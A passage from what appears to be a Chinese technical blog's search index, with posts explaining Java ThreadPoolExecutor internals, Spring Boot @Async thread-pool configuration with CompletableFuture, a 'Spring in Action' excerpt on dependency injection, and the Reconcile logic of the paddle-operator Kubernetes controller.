false)) reject(command); } 这三处if判断，还是比较泛的，整体大框框上的流程，可用下图表示。 在execute方法中，用到了double-check的思想，我们看到上述代码中并没有同步控制，都是基于乐观的check，如果任务可以创建则进入addWorker(Runnable firstTask, boolean core)方法，注意上述代码中的三种传参方式： addWorker(command, true)： 创建核心线程执行任务； addWorker(command, false)：创建非核心线程执行任务； addWorker(null, false)： 创建非核心线程，当前任务为空； addWorker的返回值是boolean，不保证操作成功。下面详看addWorker方法（代码稍微有点长）： ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:5:1","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"addWorker() private boolean addWorker(Runnable firstTask, boolean core) { // 第一部分：自旋、CAS、重读ctl 等结合，直到确定是否可以创建worker， // 可以则跳出循环继续操作，否则返回false retry: for (;;) { int c = ctl.get(); int rs = runStateOf(c); // Check if queue empty only if necessary. if (rs \u003e= SHUTDOWN \u0026\u0026 ! (rs == SHUTDOWN \u0026\u0026 firstTask == null \u0026\u0026 ! workQueue.isEmpty())) return false; for (;;) { int wc = workerCountOf(c); if (wc \u003e= CAPACITY || wc \u003e= (core ? corePoolSize : maximumPoolSize)) return false; if (compareAndIncrementWorkerCount(c)) // CAS增长workerCount，成功则跳出循环 break retry; c = ctl.get(); // Re-read ctl 重新获取ctl if (runStateOf(c) != rs) // 状态改变则继续外层循环，否则在内层循环 continue retry; // else CAS failed due to workerCount change; retry inner loop } } // 第二部分：创建worker，这部分使用ReentrantLock锁 boolean workerStarted = false; // 线程启动标志位 boolean workerAdded = false; // 线程是否加入workers 标志位 Worker w = null; try { w = new Worker(firstTask); //创建worker final Thread t = w.thread; if (t != null) { final ReentrantLock mainLock = this.mainLock; mainLock.lock(); try { // 获取到锁以后仍需检查ctl，可能在上一个获取到锁处理的线程可能会改变runState // 如 ThreadFactory 创建失败 或线程池被 shut down等 int rs = runStateOf(ctl.get()); if (rs \u003c SHUTDOWN || (rs == SHUTDOWN \u0026\u0026 firstTask == null)) { if (t.isAlive()) throw new IllegalThreadStateException(); workers.add(w); int s = workers.size(); if (s \u003e largestPoolSize) largestPoolSize = s; workerAdded = true; } } finally { mainLock.unlock(); } if (workerAdded) { t.start(); // 启动线程 workerStarted = true; } } } finally { if (! workerStarted) addWorkerFailed(w); // 失败操作 } return workerStarted; } addWorker的工作可分为两个部分： 第一部分：原子操作，判断是否可以创建worker。通过自旋、CAS、ctl 等操作，判断继续创建还是返回false，自旋周期一般很短。 第二部分：同步创建workder，并启动线程。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:5:2","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"Class Worker 第一部分思路理清楚，就可以理解了。下面详解第二部分的Worker： Worker是ThreadPoolExecutor的内部类，实现了 AbstractQueuedSynchronizer 并继承了 Runnable。 private final class Worker extends AbstractQueuedSynchronizer implements Runnable { private static final long serialVersionUID = 6138294804551838833L; /** 每个worker有自己的内部线程，ThreadFactory创建失败时是null */ final Thread thread; /** 初始化任务，可能是null */ Runnable firstTask; /** 每个worker的完成任务数 */ volatile long completedTasks; Worker(Runnable firstTask) { setState(-1); // 禁止线程在启动前被打断 this.firstTask = firstTask; this.thread = getThreadFactory().newThread(this); } /** 重要的执行方法 */ public void run() { runWorker(this); } // state = 0 代表未锁；state = 1 代表已锁 protected boolean isHeldExclusively() { return getState() != 0; } protected boolean tryAcquire(int unused) { if (compareAndSetState(0, 1)) { setExclusiveOwnerThread(Thread.currentThread()); return true; } return false; } protected boolean tryRelease(int unused) { setExclusiveOwnerThread(null); setState(0); return true; } public void lock() { acquire(1); } public boolean tryLock() { return tryAcquire(1); } public void unlock() { release(1); } public boolean isLocked() { return isHeldExclusively(); } // interrupt已启动线程 void interruptIfStarted() { Thread t; // 初始化是 state = -1，不会被interrupt if (getState() \u003e= 0 \u0026\u0026 (t = thread) != null \u0026\u0026 !t.isInterrupted()) { try { t.interrupt(); } catch (SecurityException ignore) { } } } } Worker 实现了简单的 非重入互斥锁，互斥容易理解，非重入是为了避免线程池的一些控制方法获得重入锁，比如setCorePoolSize操作。注意 Worker 实现锁的目的与传统锁的意义不太一样。其主要是为了控制线程是否可interrupt，以及其他的监控，如线程是否 active（正在执行任务）。 线程池里线程是否处于运行状态与普通线程不一样，普通线程可以调用 Thread.currentThread().isAlive() 方法来判断，而线程池，在run方法中可能在等待获取新任务，这期间线程线程是 alive 但是却不是 active。 runWorker代码如下： final void runWorker(Worker w) { Thread wt = Thread.currentThread(); Runnable task = w.firstTask; w.firstTask = null; w.unlock(); // 允许被 interrupt boolean completedAbruptly = true; try { // loop 直至 task = null （线程池关闭、超时等） // 注意这里的getTask()方法，我们配置的阻塞队列会在这里起作用 while (task != null || (task = getTask()) != null) { w.lock(); // 执行任务前上锁 // 如果线程池停止，确保线程中断; 如果没有，确保线程不中断。这需要在第二种情况下进行重新获取ctl，以便在清除中断时处理shutdownNow竞争 if ((runStateAtLeast(ctl.get(), STOP) || (Thread.interrupted() \u0026\u0026 runStateAtLeast(ctl.get(), STOP))) \u0026\u0026 !wt.isInterrupted()) wt.interrupt(); try { beforeExecute(wt, task); // 扩展点 Throwable thrown = null; try { task.run(); // 真正执行run方法 } catch (RuntimeException x) { thrown = x; throw x; } catch (Error x) { thrown = x; throw x; } catch (Throwable x) { thrown = x; throw new Error(x); } finally { afterExecute(task, thrown); // 扩展点 } } finally { task = null; w.completedTasks++; w.unlock(); } } completedAbruptly = false; } finally { processWorkerExit(w, completedAbruptly); // 线程退出工作 } } runWorker的主要任务就是一直loop循环，来一个任务处理一个任务，没有任务就去getTask()，getTask()可能会阻塞，代码如下： private Runnable getTask() { boolean timedOut = false; // 上一次 poll() 是否超时 for (;;) { int c = ctl.get(); int rs = runStateOf(c); // 是否继续处理任务 可以参见上一篇的状态控制 if (rs \u003e= SHUTDOWN \u0026\u0026 (rs \u003e= STOP || workQueue.isEmpty())) { decrementWorkerCount(); return null; } int wc = workerCountOf(c); // 是否允许超时 boolean timed = allowCoreThreadTimeOut || wc \u003e corePoolSize; if ((wc \u003e maximumPoolSize || (timed \u0026\u0026 timedOut)) \u0026\u0026 (wc \u003e 1 || workQueue.isEmpty())) { if (compareAndDecrementWorkerCount(c)) return null; continue; } try { Runnable r = timed ? workQueue.poll(keepAliveTime, TimeUnit.NANOSECONDS) : workQueue.take(); if (r != null) return r; timedOut = true; } catch (InterruptedException retry) { timedOut = false; } } } getTask()方法里面主要用我们配置的workQueue来工作，其阻塞原理与超时原理基于阻塞队列实现，这里不做详解。 总结，ThreadPoolExecutor的执行主要围绕Worker，Worker 实现了 AbstractQueuedSynchronizer 并继承了 Runnable，其对锁的妙运用，值得思考。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:5:3","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"ScheduledThreadPoolExecutor 参考如下： 线程池之ScheduledThreadPoolExecutor概述 线程池之ScheduledThreadPoolExecutor调度原理 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:6:0","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"Springboot 多线程 在Springboot中对其进行了简化处理，只需要配置一个类型为java.util.concurrent.TaskExecutor或其子类的bean，并在配置类或直接在程序入口类上声明注解@EnableAsync。 调用也简单，在由Spring管理的对象的方法上标注注解@Async，显式调用即可生效。 一般使用Spring提供的ThreadPoolTaskExecutor类。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:7:0","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"配置实例快速使用 SpringBoot应用中需要添加@EnableAsync注解，来开启异步调用，一般还会配置一个线程池，异步的方法交给特定的线程池完成 @Configuration @EnableAsync public class AsyncConfiguration { @Bean(\"doSomethingExecutor\") public Executor doSomethingExecutor() { ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor(); // 核心线程数：线程池创建时候初始化的线程数 executor.setCorePoolSize(10); // 最大线程数：线程池最大的线程数，只有在缓冲队列满了之后才会申请超过核心线程数的线程 executor.setMaxPoolSize(20); // 缓冲队列：用来缓冲执行任务的队列 executor.setQueueCapacity(500); // 允许线程的空闲时间60秒：当超过了核心线程之外的线程在空闲时间到达之后会被销毁 executor.setKeepAliveSeconds(60); // 线程池名的前缀：设置好了之后可以方便我们定位处理任务所在的线程池 executor.setThreadNamePrefix(\"do-something-\"); // 缓冲队列满了之后的拒绝策略：由调用线程处理（一般是主线程） executor.setRejectedExecutionHandler(new ThreadPoolExecutor.DiscardPolicy()); executor.initialize(); return executor; } } 使用的方式非常简单，在需要异步的方法上加@Async注解 @RestController public class AsyncController { @Autowired private AsyncService asyncService; @GetMapping(\"/open/something\") public String something() { int count = 10; for (int i = 0; i \u003c count; i++) { asyncService.doSomething(\"index = \" + i); } lon return \"success\"; } } @Slf4j @Service public class AsyncService { // 指定使用beanname为doSomethingExecutor的线程池 @Async(\"doSomethingExecutor\") public String doSomething(String message) { log.info(\"do something, message={}\", message); try { Thread.sleep(1000); } catch (InterruptedException e) { log.error(\"do something error: \", e); } return message; } } 访问：127.0.0.1:8080/open/something，日志如下 2020-04-19 23:42:42.486 INFO 21168 --- [io-8200-exec-17] x.g.b.system.controller.AsyncController : do something end, time 8 milliseconds 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-1] x.gits.boot.system.service.AsyncService : do something, message=index = 0 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-5] x.gits.boot.system.service.AsyncService : do something, message=index = 4 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-4] x.gits.boot.system.service.AsyncService : do something, message=index = 3 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-6] x.gits.boot.system.service.AsyncService : do something, message=index = 5 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-9] x.gits.boot.system.service.AsyncService : do something, message=index = 8 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-8] x.gits.boot.system.service.AsyncService : do something, message=index = 7 2020-04-19 23:42:42.488 INFO 21168 --- [do-something-10] x.gits.boot.system.service.AsyncService : do something, message=index = 9 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-7] x.gits.boot.system.service.AsyncService : do something, message=index = 6 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-2] x.gits.boot.system.service.AsyncService : do something, message=index = 1 2020-04-19 23:42:42.488 INFO 21168 --- [ do-something-3] x.gits.boot.system.service.AsyncService : do something, message=index = 2 由此可见已经达到异步执行的效果了，并且使用到了咱们配置的线程池。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:7:1","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"获取异步方法返回值 当异步方法有返回值时，如何获取异步方法执行的返回结果呢？这时需要异步调用的方法带有返回值CompletableFuture。 CompletableFuture是对Feature的增强，Feature只能处理简单的异步任务，而CompletableFuture可以将多个异步任务进行复杂的组合。如下： @RestController public class AsyncController { @Autowired private AsyncService asyncService; @SneakyThrows @ApiOperation(\"异步 有返回值\") @GetMapping(\"/open/somethings\") public String somethings() { CompletableFuture\u003cString\u003e createOrder = asyncService.doSomething1(\"create order\"); CompletableFuture\u003cString\u003e reduceAccount = asyncService.doSomething2(\"reduce account\"); CompletableFuture\u003cString\u003e saveLog = asyncService.doSomething3(\"save log\"); // 等待所有任务都执行完 CompletableFuture.allOf(createOrder, reduceAccount, saveLog).join(); // 获取每个任务的返回结果 String result = createOrder.get() + reduceAccount.get() + saveLog.get(); return result; } } @Slf4j @Service public class AsyncService { @Async(\"doSomethingExecutor\") public CompletableFuture\u003cString\u003e doSomething1(String message) throws InterruptedException { log.info(\"do something1: {}\", message); Thread.sleep(1000); return CompletableFuture.completedFuture(\"do something1: \" + message); } @Async(\"doSomethingExecutor\") public CompletableFuture\u003cString\u003e doSomething2(String message) throws InterruptedException { log.info(\"do something2: {}\", message); Thread.sleep(1000); return CompletableFuture.completedFuture(\"; do something2: \" + message); } @Async(\"doSomethingExecutor\") public CompletableFuture\u003cString\u003e doSomething3(String message) throws InterruptedException { log.info(\"do something3: {}\", message); Thread.sleep(1000); return CompletableFuture.completedFuture(\"; do something3: \" + message); } } 访问接口 C:\\Users\\Administrator\u003ecurl -X GET \"http://localhost:8200/open/somethings\" -H \"accept: */*\" do something1: create order; do something2: reduce account; do something3: save log 控制台上关键日志如下： 2020-04-20 00:27:42.238 INFO 5672 --- [ do-something-3] x.gits.boot.system.service.AsyncService : do something3: save log 2020-04-20 00:27:42.238 INFO 5672 --- [ do-something-2] x.gits.boot.system.service.AsyncService : do something2: reduce account 2020-04-20 00:27:42.238 INFO 5672 --- [ do-something-1] x.gits.boot.system.service.AsyncService : do something1: create order 以上多线程之间并无执行和完成先后顺序 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:7:2","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"注意事项 @Async注解会在以下几个场景失效，也就是说明明使用了@Async注解，但就没有走多线程。 异步方法使用static关键词修饰； 异步类不是一个Spring容器的bean（一般使用注解@Component和@Service，并且能被Spring扫描到）； SpringBoot应用中没有添加@EnableAsync注解； 在同一个类中，一个方法调用另外一个有@Async注解的方法，注解不会生效。原因是@Async注解的方法，是在代理类中执行的。 需要注意的是： 异步方法使用注解@Async的返回值只能为void或者Future及其子类，当返回结果为其他类型时，方法还是会异步执行，但是返回值都是null ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:7:3","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"附录 线程启动原理 线程中断机制 多线程实现方式 FutureTask实现原理 线程池之ThreadPoolExecutor概述 线程池之ThreadPoolExecutor使用 线程池之ThreadPoolExecutor状态控制 线程池之ThreadPoolExecutor执行原理 线程池之ScheduledThreadPoolExecutor概述 线程池之ScheduledThreadPoolExecutor调度原理 线程池的优雅关闭实践 SpringBoot中如何优雅的使用多线程 Java多线程看这一篇就足够了（吐血超详细总结） ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:8:0","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"Spring实战电子书和源码 📚Spring 实战(第 5 版) GitBook 📚Spring 实战(第 5 版) 源码 1.1 什么是 Spring？ 我知道你可能很想开始编写 Spring 应用程序，我向你保证，在本章结束之前，你将开发一个简单的应用程序。但是首先，我得介绍一些 Spring 的基本概念，以帮助你了解 Spring 的变化。 任何不平凡的应用程序都由许多组件组成，每个组件负责自己的在整体应用程序中的那部分功能，并与其他应用程序元素协调以完成工作。在运行应用程序时，需要以某种方式创建这些组件并相互引用。 Spring 的核心是一个 容器，通常称为 Spring 应用程序上下文，用于创建和管理应用程序组件。这些组件（或 bean）在 Spring 应用程序上下文中连接在一起以构成一个完整的应用程序，就像将砖、灰浆、木材、钉子、管道和电线绑在一起以组成房屋。 将 bean 连接在一起的行为是基于一种称为 依赖注入（DI）的模式。依赖项注入的应用程序不是由组件自身创建和维护它们依赖的其他 bean 的生命周期，而是依赖于单独的实体（容器）来创建和维护所有组件，并将这些组件注入需要它们的 bean。通常通过构造函数参数或属性访问器方法完成此操作。 例如，假设在应用程序的许多组件中，要处理两个组件：inventory service（用于获取库存级别）和 product service（用于提供基本产品信息）。product service 取决于 inventory service，以便能够提供有关产品的完整信息。图 1.1 说明了这些 bean 与 Spring 应用程序上下文之间的关系。 除了其核心容器之外，Spring 和完整的相关库产品组合还提供 Web 框架、各种数据持久性选项、安全框架与其他系统的集成、运行时监视、微服务支持、响应式编程模型以及许多其他功能，应用于现代应用程序开发。 从历史上看，引导 Spring 应用程序上下文将 bean 连接在一起的方式是使用一个或多个 XML 文件，这些文件描述了组件及其与其他组件的关系。例如，以下 XML 声明两个 bean，一个 InventoryService bean 和一个 ProductService bean，然后通过构造函数参数将 InventoryService bean 注入到 ProductService 中： 图 1.1 通过 Spring 上下文管理应用组件和注入 \u003cbean id=\"inventoryService\" class=\"com.example.InventoryService\" /\u003e \u003cbean id=\"productService\" class=\"com.example.ProductService\" \u003e \u003cconstructor-arg ref=\"inventoryService\" /\u003e \u003c/bean\u003e 但是，在最新版本的 Spring 中，基于 Java 的配置更为常见。以下基于 Java 的配置类等效于 XML 配置： @Configuration public class ServiceConfiguration { @Bean public InventoryService inventoryService() { return new InventoryService(); } @Bean public ProductService productService() { return new ProductService(inventoryService()); } } @Configuration 注释向 Spring 表明这是一个配置类，它将为 Spring 应用程序上下文提供 beans。 配置的类方法带有 @Bean 注释，指示它们返回的对象应作为 beans 添加到应用程序上下文中（默认情况下，它们各自的 bean IDs 将与定义它们的方法的名称相同）。 与基于 XML 的配置相比，基于 Java 的配置具有多个优点，包括更高的类型安全性和改进的可重构性。即使这样，仅当 Spring 无法自动配置组件时，才需要使用 Java 或 XML 进行显式配置。 自动配置起源于 Spring 技术，即 自动装配 和 组件扫描。借助组件扫描，Spring 可以自动从应用程序的类路径中发现组件，并将其创建为 Spring 应用程序上下文中的 bean。通过自动装配，Spring 会自动将组件与它们依赖的其他 bean 一起注入。 最近，随着 Spring Boot 的推出，自动配置的优势已经远远超出了组件扫描和自动装配。Spring Boot 是 Spring 框架的扩展，它提供了多项生产力增强功能。这些增强功能中最著名的就是 自动配置，在这种配置中，Spring Boot 可以根据类路径中的条目、环境变量和其他因素，合理地猜测需要配置哪些组件，并将它们连接在一起。 这里想要展示一些演示自动配置的示例代码，但是并没有这样的代码，自动配置就如同风一样，可以看到它的效果，但是没有代码可以展示。我可以说 “看！这是自动配置的示例！” 事情发生、组件启用并且提供了功能，而无需编写代码。缺少代码是自动配置必不可少的要素，这使它如此出色。 Spring Boot 自动配置大大减少了构建应用程序所需的显式配置（无论是 XML 还是 Java）的数量。实际上，当完成本章中的示例时，将拥有一个正在运行的 Spring 应用程序，该应用程序仅包含一行 Spring 配置代码！ Spring Boot 极大地增强了 Spring 开发的能力，很难想象没有它如何开发 Spring 应用程序。因此，本书将 Spring 和 Spring Boot 视为一模一样。我们将尽可能使用 Spring Boot，并仅在必要时使用显式配置。而且，由于 Spring XML 配置是使用 Spring 的老派方式，因此我们将主要关注基于 Java 的 Spring 配置。 ","date":"2021-11-08","objectID":"/posts/2021/11/spring-%E5%AE%9E%E6%88%98%E7%AC%AC-5-%E7%89%88/:0:0","tags":["Java"],"title":"Spring 实战(第 5 版)","uri":"/posts/2021/11/spring-%E5%AE%9E%E6%88%98%E7%AC%AC-5-%E7%89%88/"},{"categories":["K8S"],"content":"operator实际上就是控制器，核心逻辑是Reconcile paddle operator是在\"sigs.k8s.io/controller-runtime\"基础上实现的控制器 源码版本： v0.3.0 源码地址：https://github.com/PaddleFlow/paddle-operator ","date":"2021-11-03","objectID":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/:0:0","tags":["K8S"],"title":"paddle-operator分析","uri":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"Reconcile Reconcile实现，将用户在对象中指定的状态与实际群集状态进行比较，然后执行操作，使实际群集状态反映用户指定的状态。 // Request contains the information necessary to reconcile a Kubernetes object. This includes the // information to uniquely identify the object - its Name and Namespace. It does NOT contain information about // any specific Event or the object contents itself. type Request struct { // NamespacedName is the name and namespace of the object to reconcile. types.NamespacedName } // Result contains the result of a Reconciler invocation. type Result struct { // Requeue tells the Controller to requeue the reconcile key. Defaults to false. Requeue bool // RequeueAfter if greater than 0, tells the Controller to requeue the reconcile key after the Duration. // Implies that Requeue is true, there is no need to set Requeue to true at the same time as RequeueAfter. RequeueAfter time.Duration } /* Reconciler implements a Kubernetes API for a specific Resource by Creating, Updating or Deleting Kubernetes objects, or by making changes to systems external to the cluster (e.g. cloudproviders, github, etc). reconcile implementations compare the state specified in an object by a user against the actual cluster state, and then perform operations to make the actual cluster state reflect the state specified by the user. Typically, reconcile is triggered by a Controller in response to cluster Events (e.g. Creating, Updating, Deleting Kubernetes objects) or external Events (GitHub Webhooks, polling external sources, etc). Example reconcile Logic: * Read an object and all the Pods it owns. * Observe that the object spec specifies 5 replicas but actual cluster contains only 1 Pod replica. * Create 4 Pods and set their OwnerReferences to the object. reconcile may be implemented as either a type: type reconcile struct {} func (reconcile) reconcile(controller.Request) (controller.Result, error) { // Implement business logic of reading and writing objects here return controller.Result{}, nil } Or as a function: controller.Func(func(o controller.Request) (controller.Result, error) { // Implement business logic of reading and writing objects here return controller.Result{}, nil }) Reconciliation is level-based, meaning action isn't driven off changes in individual Events, but instead is driven by actual cluster state read from the apiserver or a local cache. For example if responding to a Pod Delete Event, the Request won't contain that a Pod was deleted, instead the reconcile function observes this when reading the cluster state and seeing the Pod as missing. */ type Reconciler interface { // Reconciler performs a full reconciliation for the object referred to by the Request. // The Controller will requeue the Request to be processed again if an error is non-nil or // Result.Requeue is true, otherwise upon completion it will remove the work from the queue. Reconcile(context.Context, Request) (Result, error) } ","date":"2021-11-03","objectID":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/:1:0","tags":["K8S"],"title":"paddle-operator分析","uri":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"Reconcile实现 Reconcile函数处理逻辑简化如下 func (r *PaddleJobReconciler) Reconcile(ctx context.Context, req ctrl.Request) (ctrl.Result, error) { // 1 获取PaddleJob资源对象pdj r.Get(ctx, req.NamespacedName, \u0026pdj) // pdj 的finalize处理 // 2 获取该PaddleJob资源pdj对象关联的pod资源列表 r.List(ctx, \u0026childPods, client.InNamespace(req.Namespace), client.MatchingFields{ctrlRefKey: req.Name}) // 3 根据最新的pods状态，来同步更新pdj的状态 r.syncCurrentStatus(ctx, \u0026pdj, childPods) // 4 删除不需要的pod，如pod的副本数 \u003e pdj.GetSpecs定义的数量 r.deleteResource(ctx, \u0026pdj, \u0026childPods.Items[i]) // 5 如果 pdj.Spec.Intranet == pdv1.Service，为pdj关联的每个pod 创建 svc // 6 按策略清理删除Failed和Completed状态的pod和svc cleanOne() // 7 根据pdj.GetStatuses和pdj.GetSpecs的比较判断，进行pod创建 createPod(res, i) // constructPod // 8 当未设置Spec.Elastic，需等待pdj的所有pod全部运行（应该是ready）起来后，再为该pdj创建configmap // Create configmap of global env for all pods after all pods are running // 说明： 这里isAllPodsReady准确的含义如下 // Since the ip or alternative information of pods are collected to the configmap, the configmap will be created after the pods allocated but the pods will not running until configmap ready. // 还要保证所有pod的ip已分配，即pod.Status.PodIP，才能为该pdj创建configmap if pdj.Spec.Elastic == nil \u0026\u0026 isAllPodsReady(\u0026pdj) { cm := constructConfigMap(\u0026pdj, childPods) r.createResource(ctx, \u0026pdj, cm) } } ","date":"2021-11-03","objectID":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/:2:0","tags":["K8S"],"title":"paddle-operator分析","uri":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"syncCurrentStatus 同步更新pdj.Status // 根据最新的pods状态，来同步更新pdj的状态 func (r *PaddleJobReconciler) syncCurrentStatus(ctx context.Context, pdj *pdv1.PaddleJob, childPods corev1.PodList) { syncStatusByPod := func(ss *pdv1.ResourceStatus, pod *corev1.Pod) { if pod.CreationTimestamp.Before(\u0026pdj.CreationTimestamp) { return } // pod status -\u003e pdj status的映射转换 switch pod.Status.Phase { case corev1.PodPending: ss.Pending++ case corev1.PodRunning: // 进一步检查pod中的容器状态是否ready和running if isPodRealRuning(pod) { ss.Running++ } else { // 此时pod中的容器尚未全部起来 ss.Starting++ } case corev1.PodFailed: ss.Failed++ case corev1.PodSucceeded: ss.Succeeded++ } pref, err := ref.GetReference(r.Scheme, pod) if err != nil { return } // 更新pdj status的refs ss.Refs = append(ss.Refs, *pref) } pdj.Status = pdv1.PaddleJobStatus{ Phase: getPaddleJobPhase(pdj), Mode: getPaddleJobMode(pdj), StartTime: getPaddleJobStartTime(pdj), CompletionTime: getPaddleJobCompleteTime(pdj), } statuses := map[string]*pdv1.ResourceStatus{} for i, pod := range childPods.Items { resType := pod.Annotations[pdv1.ResourceAnnotation] if statuses[resType] == nil { statuses[resType] = \u0026pdv1.ResourceStatus{} } syncStatusByPod(statuses[resType], \u0026childPods.Items[i]) } for resType, status := range statuses { pdj.SetStatus(resType, status) } } func (pdj *PaddleJob) SetStatus(resType string, status *ResourceStatus) { switch resType { case ResourcePS: pdj.Status.PS = status case ResourceWorker: pdj.Status.Worker = status case ResourceHeter: pdj.Status.Heter = status } } ","date":"2021-11-03","objectID":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/:3:0","tags":["K8S"],"title":"paddle-operator分析","uri":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"help func pdj的状态判断函数 func isAllPodsReady(pdj *pdv1.PaddleJob) bool { specs := pdj.GetSpecs() statuses := pdj.GetStatuses() for k, _ := range specs { if !isPodReady(specs[k], statuses[k]) { return false } } return true } func isPodReady(spec *pdv1.ResourceSpec, status *pdv1.ResourceStatus) bool { if spec == nil { return true } if status != nil \u0026\u0026 len(status.Refs) == spec.Replicas { return true } return false } func isFailed(status *pdv1.ResourceStatus) bool { return status != nil \u0026\u0026 status.Failed \u003e 0 } func isPending(status *pdv1.ResourceStatus) bool { return status != nil \u0026\u0026 status.Pending \u003e 0 } func isStarting(status *pdv1.ResourceStatus) bool { return status != nil \u0026\u0026 status.Starting \u003e 0 } func isRunning(spec *pdv1.ResourceSpec, status *pdv1.ResourceStatus) bool { return spec == nil || (status != nil \u0026\u0026 spec.Replicas == status.Running) } func isCompleted(spec *pdv1.ResourceSpec, status *pdv1.ResourceStatus) bool { return spec == nil || (status != nil \u0026\u0026 spec.Replicas == status.Succeeded) } ","date":"2021-11-03","objectID":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/:4:0","tags":["K8S"],"title":"paddle-operator分析","uri":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"configmap构造 ","date":"2021-11-03","objectID":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/:5:0","tags":["K8S"],"title":"paddle-operator分析","uri":"/posts/2021/11/paddle-operator%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"pod构造 operator 会给pod自动注入一些配置字段，如configmap func constructPod(pdj *pdv1.PaddleJob, resType string, idx int) (pod *corev1.Pod) { // ... envIP := corev1.EnvVar{ Name: \"POD_IP\", } if pdj.Spec.Intranet == pdv1.Service { envIP.Value = name } else { envIP.ValueFrom = \u0026corev1.EnvVarSource{ FieldRef: \u0026corev1.ObjectFieldSelector{ FieldPath: \"status.podIP\", }, } } envRank := corev1.EnvVar{ Name: \"PADDLE_TRAINER_ID\", Value: fmt.Sprintf(\"%d\", idx), } envRole := corev1.EnvVar{ Name: \"TRAINING_ROLE\", Value: pdv1.TrainingRole[resType], } envRole2 := corev1.EnvVar{ Name: \"PADDLE_TRAINING_ROLE\", Value: pdv1.TrainingRole[resType], } pod.Spec.Containers[0].Env = append(pod.Spec.Containers[0].Env, envIP, envRank, envRole, envRole2) // pod字段 按下面2种场景区别设置 // 场景1. pdj.Spec.Elastic时，pod无需使用pdj的configmap if pdj.Spec.Elastic != nil { envJobID := corev1.EnvVar{ Name: \"PADDLE_ELASTIC_JOB_ID\", Value: fmt.Sprintf(\"%s-%s\", pdj.Namespace, pdj.Name), } envNP := corev1.EnvVar{ Name: \"PADDLE_ELASTIC_NP\", Value: fmt.Sprintf(\"%d\", 